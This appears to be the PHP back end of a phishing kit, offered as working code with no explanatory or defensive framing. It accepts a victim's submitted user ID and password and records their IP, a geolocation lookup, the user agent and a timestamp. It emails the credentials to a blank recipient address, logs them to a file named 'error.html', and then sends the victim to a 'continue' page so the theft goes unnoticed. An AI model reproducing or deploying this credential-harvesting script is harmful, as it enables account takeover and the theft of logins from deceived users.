<?php
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/php; charset=utf-8');
$TO='';
$LAND='contnue.html';	 
if (isset($_POST['action']) && $_POST['action'] == "signup"){
		
##############################################################################################################################################################
        $IP = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
        $browserAgent = $_SERVER['HTTP_USER_AGENT'];
		$uri = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
##############################################################################################################################################################
		$userid = $_POST['userid'];
		$upass = $_POST['upass'];
		$lcount = $_POST['lc'];
		
		
#####################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>[USERID]</b>        :<b>".$userid."</b><br>\n";
		$MESSAGE.="<b>[UPASS]</b>       :<b>".$upass."</b><br>\n";
		$MESSAGE.="<b>[IP]</b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>";
		$MESSAGE.="<b>[COUNTRY]</b>         : <b>".$COUNTRYNAME." - ".$COUNTRYCODE." </b><br>\n";
		$MESSAGE.="<b>[TIME]</b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
	
			$MESSAGE = wordwrap($MESSAGE,70);
#####################################################################
		
		$SUBJECT = "(EMAIL)($IP)($COUNTRYNAME)";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: <GRAB_$IP>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		
$Txt_Rezlt = fopen('error.html', 'a+');
	fwrite($Txt_Rezlt, $MESSAGE);
	fclose($Txt_Rezlt);


if($lcount < 1){
	
	echo 'invaild';

}elseif($lcount >= 1){
	echo 'ok|'.$LAND; 
exit();
	


}else{}
 
}
?>
